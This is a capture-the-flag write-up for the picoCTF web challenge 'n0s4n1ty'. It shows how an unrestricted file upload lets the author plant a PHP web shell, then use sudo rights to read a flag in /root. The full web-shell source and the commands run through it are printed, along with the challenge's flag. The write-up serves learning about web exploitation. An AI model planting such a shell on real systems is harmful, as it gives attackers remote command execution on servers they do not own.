# n0s4n1ty
|Date|Category|Difficulty|
|--|--|--|
|2025-04-29|Web Exploitation|Easy|
## Task description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory. You can access the web application [here](http://standard-pizzas.picoctf.net:51375/)!
## Solution 
On the site there is a file upload functionality, and we can upload all types of files.
I tried to upload basic *php recote code execution* file, but it was unsuccessful.
So i tried another one php RCE:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

And it works, if we type `whoami` it will respond with `www-data`.

In the task hints there are a hint to use `sudo -l` command.
```
Matching Defaults entries for www-data on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```
It means we can use **literally all** commands with *sudo* permissions.
So lets see what is in `/root` with command `sudo ls -la /root`
There is a file `flag.txt`, lets read it with `sudo cat /root/flag.txt`
## Flag
picoCTF{wh47_c4n_u_d0_wPHP_b42a374d}
